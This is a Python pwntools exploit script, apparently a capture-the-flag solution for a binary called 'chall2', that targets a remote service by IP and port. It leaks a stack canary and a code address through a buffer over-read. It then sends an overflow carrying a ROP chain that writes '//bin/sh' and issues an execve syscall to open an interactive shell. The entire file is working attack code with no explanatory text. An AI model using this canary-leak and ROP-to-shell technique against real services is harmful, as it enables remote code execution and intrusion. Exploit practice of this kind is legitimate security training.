from pwn import *

context.arch = "amd64"
context.terminal = "tmux splitw -h".split()
#p = process("./chall2")
p = remote("103.152.242.222", 4401)

cmd = "b* $_base()+0xa22e"
DEBUG = 0
if DEBUG:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"]);

def set_buf(n, data):
    p.sendlineafter("> ", "1");
    p.sendlineafter("? ", str(n))
    p.sendline(data)
    return

def get_buf():
    p.sendlineafter("> ", "2");
    data = p.recvuntil("\n[1]", drop=True);
    return data

set_buf(41, "A"*40)
canary = u64(b'\x00'+get_buf()[41:41+7])
print(hex(canary))

set_buf(56, "A"*56)
addr_leak = u64(get_buf()[56:].ljust(8, b'\x00'))
print(hex(addr_leak))
addr_base = addr_leak - 43616
log.info("base @ 0x{:08x}".format(addr_base))


IMAGE_BASE_0 = addr_base # e0e3fdec9db96520acc30ea4c8e183820c72558812bbf0eba8b5cc1cee8cb5bb
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x00000000000219e3) # 0x00000000000219e3: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x000000000000a41b) # 0x000000000000a41b: pop rbx; ret;
rop += rebase_0(0x00000000000eb000)
rop += rebase_0(0x000000000008ab55) # 0x000000000008ab55: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000219e3) # 0x00000000000219e3: pop r13; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000a41b) # 0x000000000000a41b: pop rbx; ret;
rop += rebase_0(0x00000000000eb008)
rop += rebase_0(0x000000000008ab55) # 0x000000000008ab55: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000009c6a) # 0x0000000000009c6a: pop rdi; ret;
rop += rebase_0(0x00000000000eb000)
rop += rebase_0(0x000000000001787e) # 0x000000000001787e: pop rsi; ret;
rop += rebase_0(0x00000000000eb008)
rop += rebase_0(0x0000000000009b6f) # 0x0000000000009b6f: pop rdx; ret;
rop += rebase_0(0x00000000000eb008)
rop += rebase_0(0x00000000000621c7) # 0x00000000000621c7: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x000000000002e7f4) # 0x000000000002e7f4: syscall; ret;

pay = b"A"*40
pay += p64(canary)
pay += b"A"*8
pay += rop

set_buf(len(pay)+8, pay)
p.sendlineafter("> ", "3");
p.interactive()
